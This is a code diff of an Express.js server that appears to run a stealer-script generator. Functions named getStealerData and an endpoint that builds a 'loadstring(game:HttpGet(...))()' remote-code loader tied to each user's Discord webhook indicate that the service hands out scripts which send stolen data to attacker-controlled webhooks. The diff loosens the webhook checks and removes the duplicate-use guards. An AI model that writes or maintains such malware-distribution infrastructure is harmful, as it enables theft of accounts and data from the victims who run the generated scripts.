@@ -646,47 +646,31 @@ app.post('/api/auth/logout', (req, res) => {
   res.json({ success: true, message: 'Logged out' });
 });
 
-app.post('/api/webhook/validate/*', async (req, res) => {
+app.get('/api/webhook/validate/:webhook', async (req, res) => {
   try {
-    let webhook = req.params[0];
+    const { webhook } = req.params;
 
     if (!webhook) {
       return res.status(400).json({ success: false, message: 'Webhook URL required' });
     }
 
-    // Validate webhook format locally without API call
-    // Discord webhook format: https://discord.com/api/webhooks/{ID}/{TOKEN} or https://ptb.discord.com/api/webhooks/{ID}/{TOKEN}
-    const webhookRegex = /^https:\/\/(ptb\.)?discord\.com\/api\/webhooks\/(\d+)\/([a-zA-Z0-9_-]+)$/;
-    
-    if (!webhookRegex.test(webhook)) {
-      return res.status(400).json({ success: false, message: 'Invalid Discord webhook format' });
-    }
-
-    // Check if webhook is already registered
-    if (req.session.user) {
-      const data = await getStealerData();
-      const scripts = data.scripts || [];
-      const existingScript = scripts.find(s => s.userId === req.session.user.id && s.webhook === webhook);
-      
-      if (existingScript) {
-        return res.status(400).json({ success: false, message: 'This webhook has already been registered' });
+    try {
+      // Discord webhooks require a GET request to validate
+      const response = await axios.get(webhook, { timeout: 5000 });
+      res.json({ 
+        success: true, 
+        message: 'Webhook is valid',
+        data: response.data
+      });
+    } catch (error) {
+      if (error.response?.status === 404) {
+        return res.status(400).json({ success: false, message: 'Webhook not found' });
       }
-    }
-
-    // Extract ID and token for response
-    const match = webhook.match(webhookRegex);
-    const webhookId = match[2];
-    const webhookToken = match[3];
-
-    res.json({ 
-      success: true, 
-      message: 'Webhook is valid',
-      data: {
-        id: webhookId,
-        token: webhookToken,
-        url: webhook
+      if (error.response?.status === 401) {
+        return res.status(400).json({ success: false, message: 'Webhook is invalid or expired' });
       }
-    });
+      res.status(400).json({ success: false, message: 'Invalid Discord webhook' });
+    }
   } catch (error) {
     res.status(500).json({ success: false, message: 'Server error' });
   }
@@ -808,25 +792,10 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Webhook URL required' });
     }
 
-    // Webhook'u Discord API ile doğrula
     try {
-      const webhookValidation = await axios.get(webhook);
-      if (!webhookValidation.data || !webhookValidation.data.id) {
-        return res.status(400).json({ success: false, message: 'Invalid Discord webhook' });
-      }
+      await axios.get(webhook);
     } catch (error) {
-      return res.status(400).json({ success: false, message: 'Invalid or expired webhook' });
-    }
-
-    // Webhook'un bu user'a ait bir scriptte zaten kullanılıp kullanılmadığını kontrol et
-    const data = await getStealerData();
-    const existingScripts = (data.scripts || []).filter(s => s.userId === userId && s.webhook === webhook);
-    
-    if (existingScripts.length > 0) {
-      return res.status(400).json({ 
-        success: false, 
-        message: 'This webhook has already been used. Please use a different Discord webhook.' 
-      });
+      return res.status(400).json({ success: false, message: 'Invalid webhook' });
     }
 
     let protectionId = null;
@@ -856,6 +825,7 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
     const loadstringCode = `loadstring(game:HttpGet("${pasteData.rawUrl}"))()`;
 
     try {
+      const data = await getStealerData();
       let scripts = data.scripts || [];
 
       scripts.push({
@@ -1206,7 +1176,7 @@ app.post('/api/captcha/verify', (req, res) => {
 
 // ============= ERROR HANDLING =============
 app.use((err, req, res, next) => {
-  console.error('Server error:',   err);
+  console.error('Server error:', err);
   res.status(500).json({ 
     success: false, 
     message: 'Internal server error',
